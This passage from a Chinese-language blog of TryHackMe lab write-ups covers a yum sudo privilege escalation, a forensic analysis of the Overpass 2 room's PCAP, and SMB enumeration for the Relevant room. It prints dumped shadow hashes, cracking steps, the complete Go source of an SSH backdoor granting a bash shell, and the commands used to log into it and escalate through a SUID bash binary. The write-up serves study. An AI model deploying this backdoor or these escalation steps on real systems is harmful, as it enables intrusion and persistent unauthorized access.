sudo yum -c <span class="token variable">$TF</span>/x --enableplugin=y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240426102302904.png" alt="image-20240426102302904"></p>
<p>可以看到成功提权</p>
<p><img src="image-20240426102509406.png" alt="image-20240426102509406"></p>
<h2 id="总结-9">总结</h2>
<p>这道题就是靠web站点层层深入，先是nmap扫描的时候，扫出了web站点相关指纹信息：joomla，直接网上找相关exploit</p>
<p>发现存在sql注入，利用相关脚本得到后台账户密码，登录进去，就是找相关功能RCE，幸运的是在设置模版文件的地方发现能自定义PHP文件内容，直接注入msf生成的php反向shell，访问运行，得到shell。之后就是提权，这里是sudo提权，但在使用这个前提是，在web相关配置文件找到了用户的密码信息，得以su 切换用户（因为在此之前是apache身份）之后sudo -l发现yum，找到yum的sudo提权方式，拿到root身份</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://github.com/n00bm45t3r/DailyBugle-tryhackme/blob/master/DailyBugle-tryahackme.md">Daily Bugle --tryhackme.com</a></p>
<p><a target="_blank" rel="noopener" href="https://mrjsec.co.uk/blog/daily-bugle/">Daily Bugle </a></p>
<p><a target="_blank" rel="noopener" href="https://sumb0dyblog.wordpress.com/2020/02/06/daily-bugle-tryhackme-hard-write-up/">DAILY BUGLE – TRYHACKME WRITE-UP</a></p>
<h1>0x10 Overpass 2 - Hacked</h1>
<p>立交桥被黑了！你能分析攻击者的行为并入侵吗？</p>
<h2 id="取证-分析-PCAP">取证-分析 PCAP</h2>
<p>立交桥被黑了！SOC 团队（Paradox，恭喜晋升）在深夜值班时注意到可疑活动，同时查看 shibes，并设法在攻击发生时捕获数据包。你能弄清楚攻击者是如何进入的，并入侵Overpass的生产服务器吗？</p>
<p>注意：虽然这个房间是一个演练，但它需要熟悉工具和 Linux。我建议至少学习基本的 Wireshark 并完成 Linux 基础知识。</p>
<p>PCAP 文件的 md5sum：11c3b2e9221865580295bc662c35c6dc</p>
<p><img src="image-20240426104436133.png" alt="image-20240426104436133"></p>
<p>上图可以看到，上传文件的url为/development/，同时可以看到攻击者使用的payload</p>
<p><img src="image-20240426105014083.png" alt="image-20240426105014083"></p>
<p>上图可以看到攻击者获取到了密码，下图可以看到攻击者建立持久性的方法</p>
<p><img src="image-20240426105206257.png" alt="image-20240426105206257"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">james</span><span class="token punctuation">:</span><span class="token variable">$6</span><span class="token variable">$7GS5e</span>.yv<span class="token variable">$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu</span>/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/<span class="token punctuation">:</span><span class="token property">18464</span><span class="token punctuation">:</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">99999</span><span class="token punctuation">:</span><span class="token property">7</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">paradox</span><span class="token punctuation">:</span><span class="token variable">$6</span><span class="token variable">$oRXQu43X</span><span class="token variable">$WaAj3Z</span>/<span class="token property">4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0</span><span class="token punctuation">:</span><span class="token property">18464</span><span class="token punctuation">:</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">99999</span><span class="token punctuation">:</span><span class="token property">7</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">szymex</span><span class="token punctuation">:</span><span class="token variable">$6</span><span class="token variable">$B</span>.EnuXiO<span class="token variable">$f</span>/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/<span class="token punctuation">:</span><span class="token property">18464</span><span class="token punctuation">:</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">99999</span><span class="token punctuation">:</span><span class="token property">7</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">bee</span><span class="token punctuation">:</span><span class="token variable">$6</span>$.<span class="token property">SqHrp6z<span class="token variable">$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0</span></span><span class="token punctuation">:</span><span class="token property">18464</span><span class="token punctuation">:</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">99999</span><span class="token punctuation">:</span><span class="token property">7</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span>
<span class="token property">muirland</span><span class="token punctuation">:</span><span class="token variable">$6</span><span class="token variable">$SWybS8o2</span><span class="token variable">$9diveQinxy8PJQnGQQWbTNKeb2AiSp</span>.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.<span class="token punctuation">:</span><span class="token property">18464</span><span class="token punctuation">:</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">99999</span><span class="token punctuation">:</span><span class="token property">7</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面是攻击者获取的相关密码信息（转储影子文件所得），这里我们john爆破一下，发现有四个可以爆破出来</p>
<p><img src="image-20240426105717797.png" alt="image-20240426105717797"></p>
<p><img src="image-20240426105634948.png" alt="image-20240426105634948"></p>
<h2 id="研究-分析代码">研究-分析代码</h2>
<p>现在您已经找到了后门的代码，是时候分析它了。</p>
<p>github搜索即可，如下图可以看到默认密码和硬编码盐</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"crypto/sha512"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"io"</span>
	<span class="token string">"io/ioutil"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net"</span>
	<span class="token string">"os/exec"</span>

	<span class="token string">"github.com/creack/pty"</span>
	<span class="token string">"github.com/gliderlabs/ssh"</span>
	<span class="token string">"github.com/integrii/flaggy"</span>
	gossh <span class="token string">"golang.org/x/crypto/ssh"</span>
	<span class="token string">"golang.org/x/crypto/ssh/terminal"</span>
<span class="token punctuation">)</span>

<span class="token keyword">var</span> hash <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> <span class="token punctuation">(</span>
		lport       <span class="token builtin">uint</span>   <span class="token operator">=</span> <span class="token number">2222</span>
		lhost       net<span class="token punctuation">.</span>IP <span class="token operator">=</span> net<span class="token punctuation">.</span><span class="token function">ParseIP</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span>
		keyPath     <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"id_rsa"</span>
		fingerprint <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"OpenSSH_8.2p1 Debian-4"</span>
	<span class="token punctuation">)</span>

	flaggy<span class="token punctuation">.</span><span class="token function">UInt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lport<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"port"</span><span class="token punctuation">,</span> <span class="token string">"Local port to listen for SSH on"</span><span class="token punctuation">)</span>
	flaggy<span class="token punctuation">.</span><span class="token function">IP</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lhost<span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"interface"</span><span class="token punctuation">,</span> <span class="token string">"IP address for the interface to listen on"</span><span class="token punctuation">)</span>
	flaggy<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>keyPath<span class="token punctuation">,</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"Path to private key for SSH server"</span><span class="token punctuation">)</span>
	flaggy<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fingerprint<span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"fingerprint"</span><span class="token punctuation">,</span> <span class="token string">"SSH Fingerprint, excluding the SSH-2.0- prefix"</span><span class="token punctuation">)</span>
	flaggy<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hash<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"hash"</span><span class="token punctuation">,</span> <span class="token string">"Hash for backdoor"</span><span class="token punctuation">)</span>
	flaggy<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	log<span class="token punctuation">.</span><span class="token function">SetPrefix</span><span class="token punctuation">(</span><span class="token string">"SSH - "</span><span class="token punctuation">)</span>
	privKeyBytes<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>keyPath<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Panicln</span><span class="token punctuation">(</span><span class="token string">"Error reading privkey:\t"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	privateKey<span class="token punctuation">,</span> err <span class="token operator">:=</span> gossh<span class="token punctuation">.</span><span class="token function">ParsePrivateKey</span><span class="token punctuation">(</span>privKeyBytes<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">Panicln</span><span class="token punctuation">(</span><span class="token string">"Error parsing privkey:\t"</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	server <span class="token operator">:=</span> <span class="token operator">&amp;</span>ssh<span class="token punctuation">.</span>Server<span class="token punctuation">{</span>
		Addr<span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s:%v"</span><span class="token punctuation">,</span> lhost<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">,</span>
		Handler<span class="token punctuation">:</span>         sshterminal<span class="token punctuation">,</span>
		Version<span class="token punctuation">:</span>         fingerprint<span class="token punctuation">,</span>
		PasswordHandler<span class="token punctuation">:</span> passwordHandler<span class="token punctuation">,</span>
	<span class="token punctuation">}</span>
	server<span class="token punctuation">.</span><span class="token function">AddHostKey</span><span class="token punctuation">(</span>privateKey<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Started SSH backdoor on"</span><span class="token punctuation">,</span> server<span class="token punctuation">.</span>Addr<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>server<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">func</span> <span class="token function">verifyPass</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> password <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>
	resultHash <span class="token operator">:=</span> <span class="token function">hashPassword</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> salt<span class="token punctuation">)</span>
	<span class="token keyword">return</span> resultHash <span class="token operator">==</span> hash
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">hashPassword</span><span class="token punctuation">(</span>password <span class="token builtin">string</span><span class="token punctuation">,</span> salt <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
	hash <span class="token operator">:=</span> sha512<span class="token punctuation">.</span><span class="token function">Sum512</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>password <span class="token operator">+</span> salt<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">sshHandler</span><span class="token punctuation">(</span>s ssh<span class="token punctuation">.</span>Session<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	command <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">RawCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> command <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		s<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token function">runCommand</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	term <span class="token operator">:=</span> terminal<span class="token punctuation">.</span><span class="token function">NewTerminal</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"$ "</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> <span class="token punctuation">{</span>
		command<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> term<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"exit"</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		term<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token function">runCommand</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">sshterminal</span><span class="token punctuation">(</span>s ssh<span class="token punctuation">.</span>Session<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">)</span>
	ptyReq<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> isPty <span class="token operator">:=</span> s<span class="token punctuation">.</span><span class="token function">Pty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> isPty <span class="token punctuation">{</span>
		cmd<span class="token punctuation">.</span>Env <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>Env<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"TERM=%s"</span><span class="token punctuation">,</span> ptyReq<span class="token punctuation">.</span>Term<span class="token punctuation">)</span><span class="token punctuation">)</span>
		f<span class="token punctuation">,</span> err <span class="token operator">:=</span> pty<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> s<span class="token punctuation">)</span> <span class="token comment">// stdin</span>
		<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> f<span class="token punctuation">)</span> <span class="token comment">// stdout</span>
		cmd<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
		io<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"No PTY requested.\n"</span><span class="token punctuation">)</span>
		s<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">runCommand</span><span class="token punctuation">(</span>cmd <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span> <span class="token punctuation">{</span>
	result <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
	response<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> result<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> response
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">passwordHandler</span><span class="token punctuation">(</span><span class="token boolean">_</span> ssh<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> password <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">verifyPass</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> <span class="token string">"1c362db832f3f864c8c2fe05f2002a05"</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240426111120510.png" alt="image-20240426111120510"></p>
<p>上图是攻击者使用的hash</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426111422460.png" alt="image-20240426111422460"></p>
<p><img src="image-20240426111701501.png" alt="image-20240426111701501"></p>
<p>如上图，识别出该hash加密的可能算法，这里尝试sha512，对应的到 <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a>看一下对应的编号</p>
<p><img src="image-20240426111527572.png" alt="image-20240426111527572"></p>
<p>显然根据上述go后门文件，这里是1710的格式</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</span><span class="token punctuation">:</span>1c362db832f3f864c8c2fe05f2002a05<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426112123090.png" alt="image-20240426112123090"></p>
<p>可以看到这里成功破解出盐：november16</p>
<p><img src="image-20240426112331301.png" alt="image-20240426112331301"></p>
<h2 id="攻击-重新进入">攻击-重新进入</h2>
<p>现在事件已经调查完毕，Paradox 需要有人再次控制 Overpass 生产服务器。包装盒上有标志，Overpass不能因为格式化服务器而失去！</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.115.228 -p 2222<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240426114522880.png" alt="image-20240426114522880"></p>
<p>接下来就是提权，sudo -l没有结果，尝试suid，如下图，发现.suid_bash可疑文件</p>
<p><img src="image-20240426115357551.png" alt="image-20240426115357551"></p>
<p>file命令查看，如下图：为一个64位的ELF可执行文件。</p>
<p><img src="image-20240426115450524.png" alt="image-20240426115450524"></p>
<p>我们尝试执行，这里需要注意虽然该文件设置了suid权限，但需要你添加-p选项才可以以root身份运行，原因如下</p>
<p><img src="image-20240426120831446.png" alt="image-20240426120831446"></p>
<p><img src="image-20240426115913599.png" alt="image-20240426115913599"></p>
<p><img src="image-20240426115939874.png" alt="image-20240426115939874"></p>
<h2 id="总结-10">总结</h2>
<p>这篇文章，让我们学习的取证分析，得到流量包，在追踪TCP和HTTP流的过程，我们得知了攻击者是如何攻击该站点，并注入了后门。之后我们重新攻击的时候，直接利用该后门，ssh登录上去，身份为James，之后依旧是提权，sudo -l无果，尝试suid提权，找到一个二进制文件存在suid权限，执行的时候添加-p得到root身份。</p>
<h2 id="参考文章-2">参考文章</h2>
<p>Writeup for TryHackMe Room ‘<a target="_blank" rel="noopener" href="https://tryhackme.com/room/overpass2hacked">Overpass 2 - Hacked</a>’</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kurohat/writeUp/blob/master/TryHackMe/Easy/Overpass-2.md">Forensics - Analyse the PCAP</a></p>
<h1>0x11 Relevant</h1>
<h2 id="渗透测试要求">渗透测试要求</h2>
<p>您已被分配到一个客户端，该客户端希望在 7 天内发布到生产环境中的环境上执行渗透测试。</p>
<p><strong>Scope of Work 工作范围</strong></p>
<p>客户要求工程师对提供的虚拟环境进行评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑匣子渗透测试）。 客户端要求您保护两个标志（未提供位置）作为利用证明：</p>
<ul>
<li>User.txt</li>
<li>Root.txt</li>
</ul>
<p>此外，客户还提供了以下范围津贴：</p>
<ul>
<li>此服务允许使用任何工具或技术，但我们要求您先尝试手动利用</li>
<li>查找并记录发现的所有漏洞</li>
<li>将发现的标志提交到仪表板</li>
<li>只有分配给计算机的 IP 地址在范围内</li>
<li>查找并报告所有漏洞（是的，有多个根路径）</li>
</ul>
<p>（角色扮演关闭）</p>
<p>我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将有利于您准备 eLearnSecurity 认证专业渗透测试人员或该领域渗透测试人员的职业生涯。</p>
<p>注意 - 这个房间里没有任何东西需要Metasploit</p>
<p>计算机最多可能需要 5 分钟才能启动所有服务。</p>
<p>*<strong>此房间不接受书面记录。</strong></p>
<h2 id="常规扫描">常规扫描</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -T5 -p- 10.10.127.72<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">Starting Nmap 7.94SVN <span class="token punctuation">(</span> <span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//nmap.org ) at 2024-04-29 10:59 CST</span>
<span class="token property">Stats</span><span class="token punctuation">:</span> <span class="token property">0</span><span class="token punctuation">:</span><span class="token property">00</span><span class="token punctuation">:</span>05 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span><span class="token punctuation">,</span> 1 undergoing SYN Stealth Scan
SYN Stealth Scan <span class="token property">Timing</span><span class="token punctuation">:</span> About 0.52% done
<span class="token property">Stats</span><span class="token punctuation">:</span> <span class="token property">0</span><span class="token punctuation">:</span><span class="token property">00</span><span class="token punctuation">:</span>07 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span><span class="token punctuation">,</span> 1 undergoing SYN Stealth Scan
SYN Stealth Scan <span class="token property">Timing</span><span class="token punctuation">:</span> About 0.97% done
<span class="token property">Stats</span><span class="token punctuation">:</span> <span class="token property">0</span><span class="token punctuation">:</span><span class="token property">02</span><span class="token punctuation">:</span>51 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span><span class="token punctuation">,</span> 1 undergoing SYN Stealth Scan
SYN Stealth Scan <span class="token property">Timing</span><span class="token punctuation">:</span> About 46.66% done<span class="token punctuation">;</span> <span class="token property">ETC</span><span class="token punctuation">:</span> <span class="token property">11</span><span class="token punctuation">:</span>05 <span class="token punctuation">(</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">03</span><span class="token punctuation">:</span>15 remaining<span class="token punctuation">)</span>
<span class="token property">Stats</span><span class="token punctuation">:</span> <span class="token property">0</span><span class="token punctuation">:</span><span class="token property">04</span><span class="token punctuation">:</span>29 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span><span class="token punctuation">,</span> 1 undergoing SYN Stealth Scan
SYN Stealth Scan <span class="token property">Timing</span><span class="token punctuation">:</span> About 81.33% done<span class="token punctuation">;</span> <span class="token property">ETC</span><span class="token punctuation">:</span> <span class="token property">11</span><span class="token punctuation">:</span>05 <span class="token punctuation">(</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">01</span><span class="token punctuation">:</span>02 remaining<span class="token punctuation">)</span>
Nmap scan report for 10.10.127.72
Host is up <span class="token punctuation">(</span>0.20s latency<span class="token punctuation">)</span>.
Not <span class="token property">shown</span><span class="token punctuation">:</span> 65527 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

Nmap <span class="token property">done</span><span class="token punctuation">:</span> 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 324.81 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到139与445端口开启，尝试枚举SMB</p>
<p><img src="image-20240429111707274.png" alt="image-20240429111707274"></p>
<p>接着连接目标nt4wrksv共享SMB服务</p>
<p><img src="image-20240429113313488.png" alt="image-20240429113313488"></p>
<p>幸运的无密码即可访问，看到当前目录含有密码文件，下载查看</p>
<p><img src="image-20240429113346541.png" alt="image-20240429113346541"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">Bob <span class="token operator">-</span> !P@$<span class="token variable">$W0rD</span>!123
Bill <span class="token operator">-</span> Juw4nnaM4n420696969!$$$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>接着对这些存活端口进行详细扫描</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">nmap -p 80<span class="token punctuation">,</span>135<span class="token punctuation">,</span>139<span class="token punctuation">,</span>445<span class="token punctuation">,</span>3389<span class="token punctuation">,</span>49663<span class="token punctuation">,</span>49667<span class="token punctuation">,</span>49669 10.10.127.72 -sC -sV 
Starting Nmap 7.94SVN <span class="token punctuation">(</span> <span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//nmap.org ) at 2024-04-29 11:38 CST</span>
<span class="token property">Stats</span><span class="token punctuation">:</span> <span class="token property">0</span><span class="token punctuation">:</span><span class="token property">01</span><span class="token punctuation">:</span>09 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span><span class="token punctuation">,</span> 1 undergoing Script Scan
NSE <span class="token property">Timing</span><span class="token punctuation">:</span> About 98.38% done<span class="token punctuation">;</span> <span class="token property">ETC</span><span class="token punctuation">:</span> <span class="token property">11</span><span class="token punctuation">:</span>39 <span class="token punctuation">(</span><span class="token property">0</span><span class="token punctuation">:</span><span class="token property">00</span><span class="token punctuation">:</span>00 remaining<span class="token punctuation">)</span>
